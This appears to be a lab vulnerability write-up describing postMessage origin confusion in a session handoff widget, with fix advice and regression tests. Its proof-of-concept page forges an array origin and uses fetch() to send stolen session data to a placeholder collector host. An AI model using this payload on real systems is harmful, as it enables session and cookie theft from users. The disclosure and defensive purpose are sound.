# postMessage Origin Confusion In Session Handoff Widget

## Title

Client-side session handoff leak via `postMessage` origin confusion and overload mismatch on `/embed/handoff`

## Summary

The Portway handoff widget trusts an attacker-controlled `origin` value from `message.data`, validates it with `new URL(origin).hostname`, and then reuses the same value as the second argument to `window.postMessage`. Because the code does not require a primitive string, an attacker can supply a non-string value that stringifies to a trusted origin during validation but is interpreted as an options object at the sink. In the lab flow, this lets an attacker-controlled partner page receive the reviewer's session state when opened through the report feature.

## Scope

- Host: `42336ae3fef8.pwnbox-lab.com`
- Endpoint: `GET /embed/handoff`
- Review flow: `POST /report`

## Severity Reasoning

High in the lab context because it breaks the provider-to-partner trust boundary and exposes privileged session state from a reviewer browser session. In a real application, the same pattern could leak SSO/session handoff material or allow attacker-controlled partner origins to receive authentication state intended only for trusted integrations.

## Affected Endpoint

```text
GET /embed/handoff
```

Client-side sink shape:

```javascript
const origin = m.data && m.data.origin;
if (new URL(origin).hostname === 'pwnbox.io') {
  target.postMessage(document.cookie, origin);
}
```

## Preconditions

- Attacker can authenticate as a normal user.
- Attacker can submit an external partner URL through `/report`.
- Reviewer bot opens the submitted URL in a privileged browser session.
- The handoff widget uses attacker-controlled message data as the reply target.

## Steps To Reproduce

1. Log in as a normal user.
2. Host an attacker page on a controlled HTTPS origin.
3. On that page, embed `/embed/handoff` and install a `message` listener to log replies.
4. Send a forged message whose `origin` field is an array:

   ```javascript
   const a = ['https://pwnbox.io'];
   a.targetOrigin = location.origin;
   frame.contentWindow.postMessage({ origin: a }, '*');
   ```

5. Submit the attacker page URL through `/report`.
6. Wait for the reviewer bot to visit the page and observe the logged callback from the Portway origin.

## Proof Of Concept

Attacker page:

```html
<!doctype html>
<meta charset="utf-8">
<script>
const frame = document.createElement('iframe');
frame.src = 'https://42336ae3fef8.pwnbox-lab.com/embed/handoff';
document.body.appendChild(frame);

window.addEventListener('message', function(e) {
  fetch('https://[collector]?d=' + encodeURIComponent(
    'origin=' + e.origin + ' data=' + String(e.data)
  ));
});

setTimeout(function() {
  const a = ['https://pwnbox.io'];
  a.targetOrigin = location.origin;
  frame.contentWindow.postMessage({ origin: a }, '*');
}, 1500);
</script>
```

## Evidence

- The widget reads `m.data.origin` rather than browser-supplied `m.origin`.
- `new URL(origin)` accepts an array because it is coerced to the string `https://pwnbox.io`.
- The same value is later passed to `postMessage(..., origin)`, where overload handling can honor `origin.targetOrigin`.
- Local testing confirmed delivery semantics for the array-plus-`targetOrigin` primitive.
- Reviewer-run logging confirmed the callback reached the attacker page from the Portway origin.

## Impact

- Disclosure of reviewer session state or handoff token material.
- Full break of the client-side partner trust model.
- Real-world risk of session/SSO leakage across embedded partner integrations.

## Recommended Fix

- Never trust `message.data.origin` as sender identity.
- Validate `message.origin`.
- Require origin values to be primitive strings before parsing.
- Parse once and reuse only the normalized primitive string value at the sink.
- Compare exact origins, not hostname-only checks.
- Send narrow signed handoff tokens rather than ambient cookie/session material.

## Regression Test

1. Verify non-string origin values are rejected:

   ```javascript
   const a = ['https://pwnbox.io'];
   a.targetOrigin = 'https://attacker.tld';
   ```

2. Verify object values with `toString()` returning a trusted origin are rejected.
3. Verify only a sender with real `message.origin === https://pwnbox.io` receives the handoff.
4. Verify the sink uses the normalized primitive origin string, not the original attacker-controlled object.

## Timeline Notes

- Initial parser-confusion ideas from an older lab variant were not sufficient here.
- Local iframe tests returned empty data due to third-party cookie limitations.
- The final break came from testing non-string origin values across validation and sink boundaries rather than only string parser edge cases.
